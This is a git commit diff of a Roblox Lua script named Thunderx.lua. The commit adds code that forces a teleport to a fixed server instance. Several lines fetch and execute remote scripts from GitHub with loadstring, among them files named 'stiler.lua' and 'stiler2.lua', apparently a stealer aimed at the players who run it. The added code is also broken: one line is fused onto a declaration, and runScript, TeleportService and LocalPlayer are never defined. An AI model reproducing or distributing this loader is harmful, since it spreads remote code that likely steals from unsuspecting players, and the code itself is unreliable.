633f73a9fe7a88d54ab0e51273541934cbe6576f
Thunderxz <pbubos12@gmail.com>
2025-08-11 16:53:57 +0200

    Update Thunderx.lua

--- Thunderx.lua
+++ Thunderx.lua
@@ -1,3 +1,17 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua'))()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
+local targetPlaceId = 126884695634066
+local targetJobId = "750902da843513478c23a20c4446fdc1"loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
+-- Check if we're already in the right server
+if game.PlaceId == targetPlaceId and game.JobId == targetJobId then
+    -- Already in the correct place and job, just run the script
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
+  loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua'))()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua'))()
+else
+    -- Teleport and run the script when we arrive
+    TeleportService.TeleportSucceeded:Connect(function(_, _)
+        repeat task.wait() until game:IsLoaded()
+        runScript()
+    end)
+
+    TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
+end
